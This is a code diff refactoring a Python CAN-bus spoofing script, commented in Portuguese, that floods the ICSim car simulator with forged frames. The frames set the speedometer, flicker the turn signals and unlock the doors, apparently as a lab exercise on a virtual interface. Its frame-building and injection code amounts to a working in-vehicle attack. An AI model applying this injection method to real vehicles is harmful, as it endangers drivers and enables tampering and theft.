@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Forjar quadros legítimos com valores manipulados. A injeção é feita em 
-alta frequência (default 1 ms), sobrescrevendo as mensagens legítimas 
+Forjar quadros legítimos com valores manipulados. A injeção é feita em
+alta frequência (default 1 ms), sobrescrevendo as mensagens legítimas
 por simples superioridade de taxa.
 
 IDs do ICSim (do zombieCraig/ICSim):
@@ -11,54 +11,29 @@ IDs do ICSim (do zombieCraig/ICSim):
 
     Testes:
     # Cravar velocímetro em 220 km/h por 30s
-    python3 04_spoofing_attack.py --iface vcan0 --target speed \\
+    python3 Spoofing-attack.py --iface vcan0 --target speed \\
             --value 220 --duration 30
 
     # Acender setas alternadas (efeito flicker)
-    python3 04_spoofing_attack.py --iface vcan0 --target signals \\
+    python3 Spoofing-attack.py --iface vcan0 --target signals \\
             --pattern flicker --duration 30
 
     # Abrir todas as portas
-    python3 04_spoofing_attack.py --iface vcan0 --target doors \\
+    python3 Spoofing-attack.py --iface vcan0 --target doors \\
             --value 0x0F --duration 30
 """
 
 import argparse
 import sys
-import time
+from pathlib import Path
+
 import can
 
-# IDs do ICSim
-ID_SPEED = 0x244
-ID_SIGNAL = 0x188
-ID_DOORS = 0x19B
-
-
-def build_speed_frame(kmh: int) -> can.Message:
-    # ICSim multiplica por ~100 e armazena em little-endian nos bytes 3-4
-    raw = max(0, min(int(kmh * 100), 0xFFFF))
-    payload = bytearray(8)
-    payload[3] = raw & 0xFF
-    payload[4] = (raw >> 8) & 0xFF
-    return can.Message(
-        arbitration_id=ID_SPEED, data=bytes(payload), is_extended_id=False
-    )
-
-
-def build_signal_frame(left: bool, right: bool) -> can.Message:
-    payload = bytearray(8)
-    payload[2] = (0x01 if right else 0) | (0x02 if left else 0)
-    return can.Message(
-        arbitration_id=ID_SIGNAL, data=bytes(payload), is_extended_id=False
-    )
-
-
-def build_doors_frame(mask: int) -> can.Message:
-    payload = bytearray(8)
-    payload[2] = mask & 0x0F
-    return can.Message(
-        arbitration_id=ID_DOORS, data=bytes(payload), is_extended_id=False
-    )
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+from lib.attack_runtime import open_socketcan, run_attack_loop, print_report
+from lib.icsim_frames import (
+    build_speed_frame, build_signal_frame, build_doors_frame,
+)
 
 
 def parse_args() -> argparse.Namespace:
@@ -91,50 +66,34 @@ def parse_args() -> argparse.Namespace:
 
 def main() -> None:
     args = parse_args()
-    bus = can.interface.Bus(channel=args.iface, interface="socketcan")
-    interval_s = args.rate / 1000.0
+    bus = open_socketcan(args.iface)
 
     print(
         f"[INFO] Spoofing alvo={args.target} | valor={args.value} | "
         f"duração={args.duration}s | intervalo={args.rate}ms"
     )
 
-    sent = 0
-    flicker_state = False
-    t0 = time.perf_counter()
-    deadline = t0 + args.duration
+    # Closure mutável para alternar flicker entre chamadas.
+    state = [False]
 
-    try:
-        while time.perf_counter() < deadline:
-            if args.target == "speed":
-                msg = build_speed_frame(args.value)
-            elif args.target == "doors":
-                msg = build_doors_frame(args.value)
-            else:  # signals
-                if args.pattern == "flicker":
-                    flicker_state = not flicker_state
-                    msg = build_signal_frame(flicker_state, not flicker_state)
-                else:
-                    msg = build_signal_frame(
-                        bool(args.value & 0x02), bool(args.value & 0x01)
-                    )
-            try:
-                bus.send(msg)
-                sent += 1
-            except can.CanError:
-                pass
-            if interval_s > 0:
-                time.sleep(interval_s)
-    except KeyboardInterrupt:
-        print("\n[INFO] Interrompido pelo usuário.")
-    finally:
-        elapsed = time.perf_counter() - t0
-        bus.shutdown()
-        print(
-            f"[RESULTADO] Frames spoofados: {sent} | "
-            f"Tempo: {elapsed:.3f}s | "
-            f"Taxa média: {sent/elapsed:.0f} fps"
+    def next_message() -> can.Message:
+        if args.target == "speed":
+            return build_speed_frame(args.value)
+        if args.target == "doors":
+            return build_doors_frame(args.value)
+        # signals
+        if args.pattern == "flicker":
+            state[0] = not state[0]
+            return build_signal_frame(state[0], not state[0])
+        return build_signal_frame(
+            bool(args.value & 0x02), bool(args.value & 0x01)
         )
+
+    stats = run_attack_loop(
+        args.duration, bus, next_message,
+        rate_ms=args.rate, swallow_send_errors=True,
+    )
+    print_report("Spoofing", stats, label="Frames spoofados")
 
 
 if __name__ == "__main__":
